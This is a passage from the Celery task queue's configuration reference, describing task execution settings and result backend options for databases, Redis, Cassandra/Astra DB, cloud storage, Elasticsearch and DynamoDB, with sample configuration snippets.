settings\nenable_utc\n\nAdded in version 2.5.\n\nDefault: Enabled by default since version 3.0.\n\nIf enabled dates and times in messages will be converted to use the UTC timezone.\n\nNote that workers running Celery versions below 2.5 will assume a local timezone for all messages, so only enable if all workers have been upgraded.\n\ntimezone\n\nAdded in version 2.5.\n\nDefault: \"UTC\".\n\nConfigure Celery to use a custom time zone. The timezone value can be any time zone supported by the ZoneInfo library.\n\nIf not set the UTC timezone is used. For backwards compatibility there’s also a enable_utc setting, and when this is set to false the system local timezone is used instead.\n\nTask settings\ntask_annotations\n\nAdded in version 2.5.\n\nDefault: None.\n\nThis setting can be used to rewrite any task attribute from the configuration. The setting can be a dict, or a list of annotation objects that filter for tasks and return a map of attributes to change.\n\nThis will change the rate_limit attribute for the tasks.add task:\n\ntask_annotations = {'tasks.add': {'rate_limit': '10/s'}}\n\n\nor change the same for all tasks:\n\ntask_annotations = {'*': {'rate_limit': '10/s'}}\n\n\nYou can change methods too, for example the on_failure handler:\n\ndef my_on_failure(self, exc, task_id, args, kwargs, einfo):\n    print('Oh no! Task failed: {0!r}'.format(exc))\n\ntask_annotations = {'*': {'on_failure': my_on_failure}}\n\n\nIf you need more flexibility then you can use objects instead of a dict to choose the tasks to annotate:\n\nclass MyAnnotate:\n\n    def annotate(self, task):\n        if task.name.startswith('tasks.'):\n            return {'rate_limit': '10/s'}\n\ntask_annotations = (MyAnnotate(), {other,})\n\ntask_compression\n\nDefault: None\n\nDefault compression used for task messages. Can be gzip, bzip2 (if available), or any custom compression schemes registered in the Kombu compression registry.\n\nThe default is to send uncompressed messages.\n\ntask_protocol\n\nDefault: 2 (since 4.0).\n\nSet the default task message protocol version used to send tasks. Supports protocols: 1 and 2.\n\nProtocol 2 is supported by 3.1.24 and 4.x+.\n\ntask_serializer\n\nDefault: \"json\" (since 4.0, earlier: pickle).\n\nA string identifying the default serialization method to use. Can be json (default), pickle, yaml, msgpack, or any custom serialization methods that have been registered with kombu.serialization.registry.\n\nSee also\n\nSerializers.\n\ntask_publish_retry\n\nAdded in version 2.2.\n\nDefault: Enabled.\n\nDecides if publishing task messages will be retried in the case of connection loss or other connection errors. See also task_publish_retry_policy.\n\ntask_publish_retry_policy\n\nAdded in version 2.2.\n\nDefault: See Message Sending Retry.\n\nDefines the default policy when retrying publishing a task message in the case of connection loss or other connection errors.\n\nTask execution settings\ntask_always_eager\n\nDefault: Disabled.\n\nIf this is True, all tasks will be executed locally by blocking until the task returns. apply_async() and Task.delay() will return an EagerResult instance, that emulates the API and behavior of AsyncResult, except the result is already evaluated.\n\nThat is, tasks will be executed locally instead of being sent to the queue.\n\ntask_eager_propagates\n\nDefault: Disabled.\n\nIf this is True, eagerly executed tasks (applied by task.apply(), or when the task_always_eager setting is enabled), will propagate exceptions.\n\nIt’s the same as always running apply() with throw=True.\n\ntask_store_eager_result\n\nAdded in version 5.1.\n\nDefault: Disabled.\n\nIf this is True and task_always_eager is True and task_ignore_result is False, the results of eagerly executed tasks will be saved to the backend.\n\nBy default, even with task_always_eager set to True and task_ignore_result set to False, the result will not be saved.\n\ntask_remote_tracebacks\n\nDefault: Disabled.\n\nIf enabled task results will include the workers stack when re-raising task errors.\n\nThis requires the https://pypi.org/project/tblib/ library, that can be installed using pip:\n\n$ pip install celery[tblib]\n\n\nSee Bundles for information on combining multiple extension requirements.\n\ntask_ignore_result\n\nDefault: Disabled.\n\nWhether to store the task return values or not (tombstones). If you still want to store errors, just not successful return values, you can set task_store_errors_even_if_ignored.\n\ntask_store_errors_even_if_ignored\n\nDefault: Disabled.\n\nIf set, the worker stores all task errors in the result store even if Task.ignore_result is on.\n\ntask_track_started\n\nDefault: Disabled.\n\nIf True the task will report its status as ‘started’ when the task is executed by a worker. The default value is False as the normal behavior is to not report that level of granularity. Tasks are either pending, finished, or waiting to be retried. Having a ‘started’ state can be useful for when there are long running tasks and there’s a need to report what task is currently running.\n\ntask_time_limit\n\nDefault: No time limit.\n\nTask hard time limit in seconds. The worker processing the task will be killed and replaced with a new one when this is exceeded.\n\ntask_allow_error_cb_on_chord_header\n\nAdded in version 5.3.\n\nDefault: Disabled.\n\nEnabling this flag will allow linking an error callback to a chord header, which by default will not link when using link_error(), and preventing from the chord’s body to execute if any of the tasks in the header fails.\n\nConsider the following canvas with the flag disabled (default behavior):\n\nheader = group([t1, t2])\nbody = t3\nc = chord(header, body)\nc.link_error(error_callback_sig)\n\n\nIf any of the header tasks failed (t1 or t2), by default, the chord body (t3) would not execute, and error_callback_sig will be called once (for the body).\n\nEnabling this flag will change the above behavior by:\n\nerror_callback_sig will be linked to t1 and t2 (as well as t3).\n\nIf any of the header tasks failed, error_callback_sig will be called for each failed header task and the body (even if the body didn’t run).\n\nConsider now the following canvas with the flag enabled:\n\nheader = group([failingT1, failingT2])\nbody = t3\nc = chord(header, body)\nc.link_error(error_callback_sig)\n\n\nIf all of the header tasks failed (failingT1 and failingT2), then the chord body (t3) would not execute, and error_callback_sig will be called 3 times (two times for the header and one time for the body).\n\nLastly, consider the following canvas with the flag enabled:\n\nheader = group([failingT1, failingT2])\nbody = t3\nupgraded_chord = chain(header, body)\nupgraded_chord.link_error(error_callback_sig)\n\n\nThis canvas will behave exactly the same as the previous one, since the chain will be upgraded to a chord internally.\n\ntask_soft_time_limit\n\nDefault: No soft time limit.\n\nTask soft time limit in seconds.\n\nThe SoftTimeLimitExceeded exception will be raised when this is exceeded. For example, the task can catch this to clean up before the hard time limit comes:\n\nfrom celery.exceptions import SoftTimeLimitExceeded\n\n@app.task\ndef mytask():\n    try:\n        return do_work()\n    except SoftTimeLimitExceeded:\n        cleanup_in_a_hurry()\n\ntask_acks_late\n\nDefault: Disabled.\n\nLate ack means the task messages will be acknowledged after the task has been executed, not right before (the default behavior).\n\nSee also\n\nFAQ: Should I use retry or acks_late?.\n\ntask_acks_on_failure_or_timeout\n\nDefault: Enabled\n\nWhen enabled messages for all tasks will be acknowledged even if they fail or time out.\n\nConfiguring this setting only applies to tasks that are acknowledged after they have been executed and only if task_acks_late is enabled.\n\ntask_reject_on_worker_lost\n\nDefault: Disabled.\n\nEven if task_acks_late is enabled, the worker will acknowledge tasks when the worker process executing them abruptly exits or is signaled (e.g., KILL/INT, etc).\n\nSetting this to true allows the message to be re-queued instead, so that the task will execute again by the same worker, or another worker.\n\nWarning\n\nEnabling this can cause message loops; make sure you know what you’re doing.\n\ntask_default_rate_limit\n\nDefault: No rate limit.\n\nThe global default rate limit for tasks.\n\nThis value is used for tasks that doesn’t have a custom rate limit\n\nSee also\n\nThe worker_disable_rate_limits setting can disable all rate limits.\n\nTask result backend settings\nresult_backend\n\nDefault: No result backend enabled by default.\n\nThe backend used to store task results (tombstones). Can be one of the following:\n\nrpc\n\nSend results back as AMQP messages See RPC backend settings.\n\ndatabase\n\nUse a relational database supported by SQLAlchemy. See Database backend settings.\n\nredis\n\nUse Redis to store the results. See Redis backend settings.\n\ncache\n\nUse Memcached to store the results. See Cache backend settings.\n\nmongodb\n\nUse MongoDB to store the results. See MongoDB backend settings.\n\ncassandra\n\nUse Cassandra to store the results. See Cassandra/AstraDB backend settings.\n\nelasticsearch\n\nUse Elasticsearch to store the results. See Elasticsearch backend settings.\n\nironcache\n\nUse IronCache to store the results. See IronCache backend settings.\n\ncouchbase\n\nUse Couchbase to store the results. See Couchbase backend settings.\n\narangodb\n\nUse ArangoDB to store the results. See ArangoDB backend settings.\n\ncouchdb\n\nUse CouchDB to store the results. See CouchDB backend settings.\n\ncosmosdbsql (experimental)\n\nUse the CosmosDB PaaS to store the results. See CosmosDB backend settings (experimental).\n\nfilesystem\n\nUse a shared directory to store the results. See File-system backend settings.\n\nconsul\n\nUse the Consul K/V store to store the results See Consul K/V store backend settings.\n\nazureblockblob\n\nUse the AzureBlockBlob PaaS store to store the results See Azure Block Blob backend settings.\n\ns3\n\nUse the S3 to store the results See S3 backend settings.\n\ngcs\n\nUse the GCS to store the results See GCS backend settings.\n\nresult_backend_always_retry\n\nDefault: False\n\nIf enable, backend will try to retry on the event of recoverable exceptions instead of propagating the exception. It will use an exponential backoff sleep time between 2 retries.\n\nresult_backend_max_sleep_between_retries_ms\n\nDefault: 10000\n\nThis specifies the maximum sleep time between two backend operation retry.\n\nresult_backend_base_sleep_between_retries_ms\n\nDefault: 10\n\nThis specifies the base amount of sleep time between two backend operation retry.\n\nresult_backend_max_retries\n\nDefault: Inf\n\nThis is the maximum of retries in case of recoverable exceptions.\n\nresult_backend_thread_safe\n\nDefault: False\n\nIf True, then the backend object is shared across threads. This may be useful for using a shared connection pool instead of creating a connection for every thread.\n\nresult_backend_transport_options\n\nDefault: {} (empty mapping).\n\nA dict of additional options passed to the underlying transport.\n\nSee your transport user manual for supported options (if any).\n\nExample setting the visibility timeout (supported by Redis and SQS transports):\n\nresult_backend_transport_options = {'visibility_timeout': 18000}  # 5 hours\n\nresult_serializer\n\nDefault: json since 4.0 (earlier: pickle).\n\nResult serialization format.\n\nSee Serializers for information about supported serialization formats.\n\nresult_compression\n\nDefault: No compression.\n\nOptional compression method used for task results. Supports the same options as the task_compression setting.\n\nresult_extended\n\nDefault: False\n\nEnables extended task result attributes (name, args, kwargs, worker, retries, queue, delivery_info) to be written to backend.\n\nresult_expires\n\nDefault: Expire after 1 day.\n\nTime (in seconds, or a timedelta object) for when after stored task tombstones will be deleted.\n\nA built-in periodic task will delete the results after this time (celery.backend_cleanup), assuming that celery beat is enabled. The task runs daily at 4am.\n\nA value of None or 0 means results will never expire (depending on backend specifications).\n\nNote\n\nFor the moment this only works with the AMQP, database, cache, Couchbase, filesystem and Redis backends.\n\nWhen using the database or filesystem backend, celery beat must be running for the results to be expired.\n\nresult_cache_max\n\nDefault: Disabled by default.\n\nEnables client caching of results.\n\nThis can be useful for the old deprecated ‘amqp’ backend where the result is unavailable as soon as one result instance consumes it.\n\nThis is the total number of results to cache before older results are evicted. A value of 0 or None means no limit, and a value of -1 will disable the cache.\n\nDisabled by default.\n\nresult_chord_join_timeout\n\nDefault: 3.0.\n\nThe timeout in seconds (int/float) when joining a group’s results within a chord.\n\nresult_chord_retry_interval\n\nDefault: 1.0.\n\nDefault interval for retrying chord tasks.\n\noverride_backends\n\nDefault: Disabled by default.\n\nPath to class that implements backend.\n\nAllows to override backend implementation. This can be useful if you need to store additional metadata about executed tasks, override retry policies, etc.\n\nExample:\n\noverride_backends = {\"db\": \"custom_module.backend.class\"}\n\nDatabase backend settings\nDatabase URL Examples\n\nTo use the database backend you have to configure the result_backend setting with a connection URL and the db+ prefix:\n\nresult_backend = 'db+scheme://user:password@host:port/dbname'\n\n\nExamples:\n\n# sqlite (filename)\nresult_backend = 'db+sqlite:///results.sqlite'\n\n# mysql\nresult_backend = 'db+mysql://scott:tiger@localhost/foo'\n\n# postgresql\nresult_backend = 'db+postgresql://scott:tiger@localhost/mydatabase'\n\n# oracle\nresult_backend = 'db+oracle://scott:tiger@127.0.0.1:1521/sidname'\n\n\n\n\nPlease see Supported Databases for a table of supported databases, and Connection String for more information about connection strings (this is the part of the URI that comes after the db+ prefix).\n\ndatabase_create_tables_at_setup\n\nAdded in version 5.5.0.\n\nDefault: True by default.\n\nIf True, Celery will create the tables in the database during setup.\n\nIf False, Celery will create the tables lazily, i.e. wait for the first task to be executed before creating the tables.\n\nNote\n\nBefore celery 5.5, the tables were created lazily i.e. it was equivalent to database_create_tables_at_setup set to False.\n\ndatabase_engine_options\n\nDefault: {} (empty mapping).\n\nTo specify additional SQLAlchemy database engine options you can use the database_engine_options setting:\n\n# echo enables verbose logging from SQLAlchemy.\napp.conf.database_engine_options = {'echo': True}\n\ndatabase_short_lived_sessions\n\nDefault: Disabled by default.\n\nShort lived sessions are disabled by default. If enabled they can drastically reduce performance, especially on systems processing lots of tasks. This option is useful on low-traffic workers that experience errors as a result of cached database connections going stale through inactivity. For example, intermittent errors like (OperationalError) (2006, ‘MySQL server has gone away’) can be fixed by enabling short lived sessions. This option only affects the database backend.\n\ndatabase_table_schemas\n\nDefault: {} (empty mapping).\n\nWhen SQLAlchemy is configured as the result backend, Celery automatically creates two tables to store result meta-data for tasks. This setting allows you to customize the schema of the tables:\n\n# use custom schema for the database result backend.\ndatabase_table_schemas = {\n    'task': 'celery',\n    'group': 'celery',\n}\n\ndatabase_table_names\n\nDefault: {} (empty mapping).\n\nWhen SQLAlchemy is configured as the result backend, Celery automatically creates two tables to store result meta-data for tasks. This setting allows you to customize the table names:\n\n# use custom table names for the database result backend.\ndatabase_table_names = {\n    'task': 'myapp_taskmeta',\n    'group': 'myapp_groupmeta',\n}\n\nRPC backend settings\nresult_persistent\n\nDefault: Disabled by default (transient messages).\n\nIf set to True, result messages will be persistent. This means the messages won’t be lost after a broker restart.\n\nExample configuration\nresult_backend = 'rpc://'\nresult_persistent = False\n\n\nPlease note: using this backend could trigger the raise of celery.backends.rpc.BacklogLimitExceeded if the task tombstone is too old.\n\nE.g.\n\nfor i in range(10000):\n    r = debug_task.delay()\n\nprint(r.state)  # this would raise celery.backends.rpc.BacklogLimitExceeded\n\nCache backend settings\n\nNote\n\nThe cache backend supports the https://pypi.org/project/pylibmc/ and https://pypi.org/project/python-memcached/ libraries. The latter is used only if https://pypi.org/project/pylibmc/ isn’t installed.\n\nUsing a single Memcached server:\n\nresult_backend = 'cache+memcached://127.0.0.1:11211/'\n\n\nUsing multiple Memcached servers:\n\nresult_backend = \"\"\"\n    cache+memcached://172.19.26.240:11211;172.19.26.242:11211/\n\"\"\".strip()\n\n\nThe “memory” backend stores the cache in memory only:\n\nresult_backend = 'cache'\ncache_backend = 'memory'\n\ncache_backend_options\n\nDefault: {} (empty mapping).\n\nYou can set https://pypi.org/project/pylibmc/ options using the cache_backend_options setting:\n\ncache_backend_options = {\n    'binary': True,\n    'behaviors': {'tcp_nodelay': True},\n}\n\ncache_backend\n\nThis setting is no longer used in celery’s builtin backends as it’s now possible to specify the cache backend directly in the result_backend setting.\n\nNote\n\nThe django-celery-results - Using the Django ORM/Cache as a result backend library uses cache_backend for choosing django caches.\n\nMongoDB backend settings\n\nNote\n\nThe MongoDB backend requires the pymongo library: http://github.com/mongodb/mongo-python-driver/tree/master\n\nmongodb_backend_settings\n\nThis is a dict supporting the following keys:\n\ndatabase\n\nThe database name to connect to. Defaults to celery.\n\ntaskmeta_collection\n\nThe collection name to store task meta data. Defaults to celery_taskmeta.\n\nmax_pool_size\n\nPassed as max_pool_size to PyMongo’s Connection or MongoClient constructor. It is the maximum number of TCP connections to keep open to MongoDB at a given time. If there are more open connections than max_pool_size, sockets will be closed when they are released. Defaults to 10.\n\noptions\n\nAdditional keyword arguments to pass to the mongodb connection constructor. See the pymongo docs to see a list of arguments supported.\n\nNote\n\nWith pymongo>=4.14, options are case-sensitive when they were previously case-insensitive. See MongoClient to determine the correct case.\n\nExample configuration\nresult_backend = 'mongodb://localhost:27017/'\nmongodb_backend_settings = {\n    'database': 'mydb',\n    'taskmeta_collection': 'my_taskmeta_collection',\n}\n\nRedis backend settings\nConfiguring the backend URL\n\nNote\n\nThe Redis backend requires the https://pypi.org/project/redis/ library.\n\nTo install this package use pip:\n\n$ pip install celery[redis]\n\n\nSee Bundles for information on combining multiple extension requirements.\n\nThis backend requires the result_backend setting to be set to a Redis or Redis over TLS URL:\n\nresult_backend = 'redis://username:password@host:port/db'\n\n\nFor example:\n\nresult_backend = 'redis://localhost/0'\n\n\nis the same as:\n\nresult_backend = 'redis://'\n\n\nUse the rediss:// protocol to connect to redis over TLS:\n\nresult_backend = 'rediss://username:password@host:port/db?ssl_cert_reqs=required'\n\n\nNote that the ssl_cert_reqs string should be one of required, optional, or none (though, for backwards compatibility with older Celery versions, the string may also be one of CERT_REQUIRED, CERT_OPTIONAL, CERT_NONE, but those values only work for Celery, not for Redis directly).\n\nIf a Unix socket connection should be used, the URL needs to be in the format::\n\nresult_backend = 'socket:///path/to/redis.sock'\n\n\nThe fields of the URL are defined as follows:\n\nusername\n\nAdded in version 5.1.0.\n\nUsername used to connect to the database.\n\nNote that this is only supported in Redis>=6.0 and with py-redis>=3.4.0 installed.\n\nIf you use an older database version or an older client version you can omit the username:\n\nresult_backend = 'redis://:password@host:port/db'\n\n\npassword\n\nPassword used to connect to the database.\n\nhost\n\nHost name or IP address of the Redis server (e.g., localhost).\n\nport\n\nPort to the Redis server. Default is 6379.\n\ndb\n\nDatabase number to use. Default is 0. The db can include an optional leading slash.\n\nWhen using a TLS connection (protocol is rediss://), you may pass in all values in broker_use_ssl as query parameters. Paths to certificates must be URL encoded, and ssl_cert_reqs is required. Example:\n\nresult_backend = 'rediss://:password@host:port/db?\\\n    ssl_cert_reqs=required\\\n    &ssl_ca_certs=%2Fvar%2Fssl%2Fmyca.pem\\                  # /var/ssl/myca.pem\n    &ssl_certfile=%2Fvar%2Fssl%2Fredis-server-cert.pem\\     # /var/ssl/redis-server-cert.pem\n    &ssl_keyfile=%2Fvar%2Fssl%2Fprivate%2Fworker-key.pem'   # /var/ssl/private/worker-key.pem\n\n\nNote that the ssl_cert_reqs string should be one of required, optional, or none (though, for backwards compatibility, the string may also be one of CERT_REQUIRED, CERT_OPTIONAL, CERT_NONE).\n\nAdded in version 5.1.0.\n\nredis_backend_health_check_interval\n\nDefault: Not configured\n\nThe Redis backend supports health checks. This value must be set as an integer whose value is the number of seconds between health checks. If a ConnectionError or a TimeoutError is encountered during the health check, the connection will be re-established and the command retried exactly once.\n\nredis_backend_use_ssl\n\nDefault: Disabled.\n\nThe Redis backend supports SSL. This value must be set in the form of a dictionary. The valid key-value pairs are the same as the ones mentioned in the redis sub-section under broker_use_ssl.\n\nAdded in version 5.6.\n\nredis_backend_credential_provider\n\nDefault: Disabled.\n\nThe Redis backend supports credential provider. This value must be set in the form of a class path string or a class instance. e.g. mymodule.myfile.myclass check more details in RedisCredentialProvider doc.\n\nredis_max_connections\n\nDefault: No limit.\n\nMaximum number of connections available in the Redis connection pool used for sending and retrieving results.\n\nWarning\n\nRedis will raise a ConnectionError if the number of concurrent connections exceeds the maximum.\n\nredis_socket_connect_timeout\n\nAdded in version 4.0.1.\n\nDefault: None\n\nSocket timeout for connections to Redis from the result backend in seconds (int/float)\n\nredis_socket_timeout\n\nDefault: 120.0 seconds.\n\nSocket timeout for reading/writing operations to the Redis server in seconds (int/float), used by the redis result backend.\n\nredis_retry_on_timeout\n\nAdded in version 4.4.1.\n\nDefault: False\n\nTo retry reading/writing operations on TimeoutError to the Redis server, used by the redis result backend. Shouldn’t set this variable if using Redis connection by unix socket.\n\nredis_socket_keepalive\n\nAdded in version 4.4.1.\n\nDefault: False\n\nSocket TCP keepalive to keep connections healthy to the Redis server, used by the redis result backend.\n\nredis_client_name\n\nAdded in version 5.6.\n\nDefault: None\n\nSets the client name for Redis connections used by the result backend. This can help identify connections in Redis monitoring tools.\n\nCassandra/AstraDB backend settings\n\nNote\n\nThis Cassandra backend driver requires https://pypi.org/project/cassandra-driver/.\n\nThis backend can refer to either a regular Cassandra installation or a managed Astra DB instance. Depending on which one, exactly one between the cassandra_servers and cassandra_secure_bundle_path settings must be provided (but not both).\n\nTo install, use pip:\n\n$ pip install celery[cassandra]\n\n\nSee Bundles for information on combining multiple extension requirements.\n\nThis backend requires the following configuration directives to be set.\n\ncassandra_servers\n\nDefault: [] (empty list).\n\nList of host Cassandra servers. This must be provided when connecting to a Cassandra cluster. Passing this setting is strictly exclusive to cassandra_secure_bundle_path. Example:\n\ncassandra_servers = ['localhost']\n\ncassandra_secure_bundle_path\n\nDefault: None.\n\nAbsolute path to the secure-connect-bundle zip file to connect to an Astra DB instance. Passing this setting is strictly exclusive to cassandra_servers. Example:\n\ncassandra_secure_bundle_path = '/home/user/bundles/secure-connect.zip'\n\n\nWhen connecting to Astra DB, it is necessary to specify the plain-text auth provider and the associated username and password, which take the value of the Client ID and the Client Secret, respectively, of a valid token generated for the Astra DB instance. See below for an Astra DB configuration example.\n\ncassandra_port\n\nDefault: 9042.\n\nPort to contact the Cassandra servers on.\n\ncassandra_keyspace\n\nDefault: None.\n\nThe keyspace in which to store the results. For example:\n\ncassandra_keyspace = 'tasks_keyspace'\n\ncassandra_table\n\nDefault: None.\n\nThe table (column family) in which to store the results. For example:\n\ncassandra_table = 'tasks'\n\ncassandra_read_consistency\n\nDefault: None.\n\nThe read consistency used. Values can be ONE, TWO, THREE, QUORUM, ALL, LOCAL_QUORUM, EACH_QUORUM, LOCAL_ONE.\n\ncassandra_write_consistency\n\nDefault: None.\n\nThe write consistency used. Values can be ONE, TWO, THREE, QUORUM, ALL, LOCAL_QUORUM, EACH_QUORUM, LOCAL_ONE.\n\ncassandra_entry_ttl\n\nDefault: None.\n\nTime-to-live for status entries. They will expire and be removed after that many seconds after adding. A value of None (default) means they will never expire.\n\ncassandra_auth_provider\n\nDefault: None.\n\nAuthProvider class within cassandra.auth module to use. Values can be PlainTextAuthProvider or SaslAuthProvider.\n\ncassandra_auth_kwargs\n\nDefault: {} (empty mapping).\n\nNamed arguments to pass into the authentication provider. For example:\n\ncassandra_auth_kwargs = {\n    username: 'cassandra',\n    password: 'cassandra'\n}\n\ncassandra_options\n\nDefault: {} (empty mapping).\n\nNamed arguments to pass into the cassandra.cluster class.\n\ncassandra_options = {\n    'cql_version': '3.2.1'\n    'protocol_version': 3\n}\n\nExample configuration (Cassandra)\nresult_backend = 'cassandra://'\ncassandra_servers = ['localhost']\ncassandra_keyspace = 'celery'\ncassandra_table = 'tasks'\ncassandra_read_consistency = 'QUORUM'\ncassandra_write_consistency = 'QUORUM'\ncassandra_entry_ttl = 86400\n\nExample configuration (Astra DB)\nresult_backend = 'cassandra://'\ncassandra_keyspace = 'celery'\ncassandra_table = 'tasks'\ncassandra_read_consistency = 'QUORUM'\ncassandra_write_consistency = 'QUORUM'\ncassandra_auth_provider = 'PlainTextAuthProvider'\ncassandra_auth_kwargs = {\n  'username': '<<CLIENT_ID_FROM_ASTRA_DB_TOKEN>>',\n  'password': '<<CLIENT_SECRET_FROM_ASTRA_DB_TOKEN>>'\n}\ncassandra_secure_bundle_path = '/path/to/secure-connect-bundle.zip'\ncassandra_entry_ttl = 86400\n\nAdditional configuration\n\nThe Cassandra driver, when establishing the connection, undergoes a stage of negotiating the protocol version with the server(s). Similarly, a load-balancing policy is automatically supplied (by default DCAwareRoundRobinPolicy, which in turn has a local_dc setting, also determined by the driver upon connection). When possible, one should explicitly provide these in the configuration: moreover, future versions of the Cassandra driver will require at least the load-balancing policy to be specified (using execution profiles, as shown below).\n\nA full configuration for the Cassandra backend would thus have the following additional lines:\n\nfrom cassandra.policies import DCAwareRoundRobinPolicy\nfrom cassandra.cluster import ExecutionProfile\nfrom cassandra.cluster import EXEC_PROFILE_DEFAULT\nmyEProfile = ExecutionProfile(\n  load_balancing_policy=DCAwareRoundRobinPolicy(\n    local_dc='datacenter1', # replace with your DC name\n  )\n)\ncassandra_options = {\n  'protocol_version': 5,    # for Cassandra 4, change if needed\n  'execution_profiles': {EXEC_PROFILE_DEFAULT: myEProfile},\n}\n\n\nAnd similarly for Astra DB:\n\nfrom cassandra.policies import DCAwareRoundRobinPolicy\nfrom cassandra.cluster import ExecutionProfile\nfrom cassandra.cluster import EXEC_PROFILE_DEFAULT\nmyEProfile = ExecutionProfile(\n  load_balancing_policy=DCAwareRoundRobinPolicy(\n    local_dc='europe-west1',  # for Astra DB, region name = dc name\n  )\n)\ncassandra_options = {\n  'protocol_version': 4,      # for Astra DB\n  'execution_profiles': {EXEC_PROFILE_DEFAULT: myEProfile},\n}\n\nS3 backend settings\n\nNote\n\nThis s3 backend driver requires https://pypi.org/project/s3/.\n\nTo install, use s3:\n\n$ pip install celery[s3]\n\n\nSee Bundles for information on combining multiple extension requirements.\n\nThis backend requires the following configuration directives to be set.\n\ns3_access_key_id\n\nDefault: None.\n\nThe s3 access key id. For example:\n\ns3_access_key_id = 'access_key_id'\n\ns3_secret_access_key\n\nDefault: None.\n\nThe s3 secret access key. For example:\n\ns3_secret_access_key = 'access_secret_access_key'\n\ns3_bucket\n\nDefault: None.\n\nThe s3 bucket name. For example:\n\ns3_bucket = 'bucket_name'\n\ns3_base_path\n\nDefault: None.\n\nA base path in the s3 bucket to use to store result keys. For example:\n\ns3_base_path = '/prefix'\n\ns3_endpoint_url\n\nDefault: None.\n\nA custom s3 endpoint url. Use it to connect to a custom self-hosted s3 compatible backend (Ceph, Scality…). For example:\n\ns3_endpoint_url = 'https://.s3.custom.url'\n\ns3_region\n\nDefault: None.\n\nThe s3 aws region. For example:\n\ns3_region = 'us-east-1'\n\nExample configuration\ns3_access_key_id = 's3-access-key-id'\ns3_secret_access_key = 's3-secret-access-key'\ns3_bucket = 'mybucket'\ns3_base_path = '/celery_result_backend'\ns3_endpoint_url = 'https://endpoint_url'\n\nAzure Block Blob backend settings\n\nTo use AzureBlockBlob as the result backend you simply need to configure the result_backend setting with the correct URL.\n\nThe required URL format is azureblockblob:// followed by the storage connection string. You can find the storage connection string in the Access Keys pane of your storage account resource in the Azure Portal.\n\nExample configuration\nresult_backend = 'azureblockblob://DefaultEndpointsProtocol=https;AccountName=somename;AccountKey=Lou...bzg==;EndpointSuffix=core.windows.net'\n\nazureblockblob_container_name\n\nDefault: celery.\n\nThe name for the storage container in which to store the results.\n\nazureblockblob_base_path\n\nAdded in version 5.1.\n\nDefault: None.\n\nA base path in the storage container to use to store result keys. For example:\n\nazureblockblob_base_path = 'prefix/'\n\nazureblockblob_retry_initial_backoff_sec\n\nDefault: 2.\n\nThe initial backoff interval, in seconds, for the first retry. Subsequent retries are attempted with an exponential strategy.\n\nazureblockblob_retry_increment_base\n\nDefault: 2.\n\nazureblockblob_retry_max_attempts\n\nDefault: 3.\n\nThe maximum number of retry attempts.\n\nazureblockblob_connection_timeout\n\nDefault: 20.\n\nTimeout in seconds for establishing the azure block blob connection.\n\nazureblockblob_read_timeout\n\nDefault: 120.\n\nTimeout in seconds for reading of an azure block blob.\n\nGCS backend settings\n\nNote\n\nThis gcs backend driver requires https://pypi.org/project/google-cloud-storage/ and https://pypi.org/project/google-cloud-firestore/.\n\nTo install, use gcs:\n\n$ pip install celery[gcs]\n\n\nSee Bundles for information on combining multiple extension requirements.\n\nGCS could be configured via the URL provided in result_backend, for example:\n\nresult_backend = 'gs://mybucket/some-prefix?gcs_project=myproject&ttl=600'\nresult_backend = 'gs://mybucket/some-prefix?gcs_project=myproject?firestore_project=myproject2&ttl=600'\n\n\nThis backend requires the following configuration directives to be set:\n\ngcs_bucket\n\nDefault: None.\n\nThe gcs bucket name. For example:\n\ngcs_bucket = 'bucket_name'\n\ngcs_project\n\nDefault: None.\n\nThe gcs project name. For example:\n\ngcs_project = 'test-project'\n\ngcs_base_path\n\nDefault: None.\n\nA base path in the gcs bucket to use to store all result keys. For example:\n\ngcs_base_path = '/prefix'\n\ngcs_ttl\n\nDefault: 0.\n\nThe time to live in seconds for the results blobs. Requires a GCS bucket with “Delete” Object Lifecycle Management action enabled. Use it to automatically delete results from Cloud Storage Buckets.\n\nFor example to auto remove results after 24 hours:\n\ngcs_ttl = 86400\n\ngcs_threadpool_maxsize\n\nDefault: 10.\n\nThreadpool size for GCS operations. Same value defines the connection pool size. Allows to control the number of concurrent operations. For example:\n\ngcs_threadpool_maxsize = 20\n\nfirestore_project\n\nDefault: gcs_project.\n\nThe Firestore project for Chord reference counting. Allows native chord ref counts. If not specified defaults to gcs_project. For example:\n\nfirestore_project = 'test-project2'\n\nExample configuration\ngcs_bucket = 'mybucket'\ngcs_project = 'myproject'\ngcs_base_path = '/celery_result_backend'\ngcs_ttl = 86400\n\nElasticsearch backend settings\n\nTo use Elasticsearch as the result backend you simply need to configure the result_backend setting with the correct URL.\n\nExample configuration\nresult_backend = 'elasticsearch://example.com:9200/index_name/doc_type'\n\nelasticsearch_retry_on_timeout\n\nDefault: False\n\nShould timeout trigger a retry on different node?\n\nelasticsearch_max_retries\n\nDefault: 3.\n\nMaximum number of retries before an exception is propagated.\n\nelasticsearch_timeout\n\nDefault: 10.0 seconds.\n\nGlobal timeout,used by the elasticsearch result backend.\n\nelasticsearch_save_meta_as_text\n\nDefault: True\n\nShould meta saved as text or as native json. Result is always serialized as text.\n\nAWS DynamoDB backend settings\n\nNote\n\nThe Dynamodb backend requires the https://pypi.org/project/boto3/ library.\n\nTo install this package use pip:\n\n$ pip install celery[dynamodb]\n\n\nSee Bundles for information on combining multiple extension requirements.\n\nWarning\n\nThe Dynamodb backend is not compatible with tables that have a sort key defined.\n\nIf you want to query the results table based on something other than the partition key, please define a global secondary index (GSI) instead.\n\nThis backend requires the result_backend setting to be set to a DynamoDB URL:\n\nresult_backend = 'dynamodb://aws_access_key_id:aws_secret_access_key@region:port/table?read=n&write=m'\n\n\nFor example, specifying the AWS region and the table name:\n\nresult_backend = 'dynamodb://@us-east-1/celery_results'\n\n\nor retrieving AWS configuration parameters from the environment, using the default table name (celery) and specifying read and write provisioned throughput:\n\nresult_backend = 'dynamodb://@/?read=5&write=5'\n\n\nor using the downloadable version of DynamoDB locally:\n\nresult_backend = 'dynamodb://@localhost:8000'\n\n\nor using downloadable version or other service with conforming API deployed on any host:\n\nresult_backend = 'dynamodb://@us-east-1'\ndynamodb_endpoint_url = 'http://192.168.0.40:8000'\n\n\nThe fields of the DynamoDB URL in result_backend are defined as follows:\n\naws_access_key_id & aws_secret_access_key\n\nThe credentials for accessing AWS API resources. These can also be resolved by the https://pypi.org/project/boto3/ library from various sources, as described here.\n\nregion\n\nThe AWS region, e.g. us-east-1 or localhost for the Downloadable Version. See the https://pypi.org/project/boto3/ library documentation for definition options.\n\nport\n\nThe listening port of the local DynamoDB instance, if you are using the downloadable version. If you have not specified the region parameter as localhost, setting this parameter has no effect.\n\ntable\n\nTable name to use. Default is celery. See 